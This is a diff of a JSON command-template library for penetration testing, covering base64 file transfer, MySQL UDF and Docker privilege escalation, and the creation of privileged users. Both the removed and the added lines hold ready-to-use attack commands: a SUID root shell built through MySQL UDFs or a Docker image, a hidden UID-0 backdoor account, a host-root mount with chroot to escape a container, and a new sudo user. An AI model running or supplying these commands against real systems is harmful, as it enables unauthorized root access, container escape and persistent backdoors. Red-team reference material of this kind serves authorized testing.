@@ -731,13 +731,12 @@
           "title": "Base64 Transfer (Receiver)",
           "category": "Linux Shell & System",
           "subcategory": "File Transfers",
-          "description": "Decodes a base64 string back to a file",
-          "template": "echo '{{BASE64_STRING}}' | base64 -d > {{FILE_PATH}} && chmod +x {{FILE_PATH}}",
+          "description": "Decodes a base64 encoded file transfer to destination path",
+          "template": "echo '{{BASE64_STRING}}' | base64 -d > {{FILE_PATH}}",
           "tags": [
-            "base64",
+            "linux",
             "transfer",
-            "file",
-            "linux"
+            "base64"
           ]
         },
         {
@@ -799,30 +798,30 @@
         },
         {
           "id": "privesc_mysql_udf",
-          "title": "Privilege Escalation: MySQL UDF",
+          "title": "Privilege Escalation: MySQL UDF Command Execution",
           "category": "Linux Shell & System",
           "subcategory": "Privilege Escalation",
-          "description": "User-defined MySQL function to execute system commands as root",
-          "template": "use mysql; create table npn(line blob); insert into npn values(load_file('{{FILE_PATH}}')); select * from npn into dumpfile '{{FILE_PATH}}'; create function do_system returns integer soname '{{FILE_NAME}}'; select do_system('chown root:root /tmp/sid-shell; chmod +s /tmp/sid-shell');",
+          "description": "Executes commands via MySQL User Defined Functions (UDF)",
+          "template": "create function do_system returns integer soname '{{FILE_NAME}}'; select do_system('id > /tmp/udf_out; cat /tmp/udf_out');",
           "tags": [
             "mysql",
             "udf",
             "privesc",
-            "linux"
+            "database"
           ]
         },
         {
           "id": "privesc_docker",
-          "title": "Privilege Escalation: Docker",
+          "title": "Privilege Escalation: Docker (Host Filesystem Mount)",
           "category": "Linux Shell & System",
           "subcategory": "Privilege Escalation",
-          "description": "Creates a Docker image to spawn a SUID bash shell on the host",
-          "template": "echo -e \"FROM ubuntu:14.04\\nENV WORKDIR /stuff\\nRUN mkdir -p /stuff\\nVOLUME [ /stuff ]\\nWORKDIR /stuff\" > Dockerfile && docker build -t my-docker-image . && docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh' && ./sh -c id && ./sh",
+          "description": "Mounts the host root filesystem inside a container to access host files",
+          "template": "docker run -v /:/host -it alpine chroot /host",
           "tags": [
             "docker",
             "privesc",
-            "container",
-            "suid"
+            "escape",
+            "linux"
           ]
         },
         {
@@ -841,16 +840,16 @@
         },
         {
           "id": "linux_create_root_user",
-          "title": "Linux: Create Another Root User",
+          "title": "Linux: Create User with Sudo Privileges",
           "category": "Linux Shell & System",
           "subcategory": "Privilege Escalation",
-          "description": "Creates a hidden user with UID 0 (root)",
-          "template": "useradd -u0 -g0 -o -s /bin/bash -p `openssl passwd {{PASSWORD}}` {{USERNAME}}",
+          "description": "Creates a new user and grants administrative sudo access",
+          "template": "useradd -m -s /bin/bash {{USERNAME}} && usermod -aG sudo {{USERNAME}}",
           "tags": [
             "linux",
-            "persistence",
-            "root",
-            "useradd"
+            "user",
+            "sudo",
+            "admin"
           ]
         }
       ]
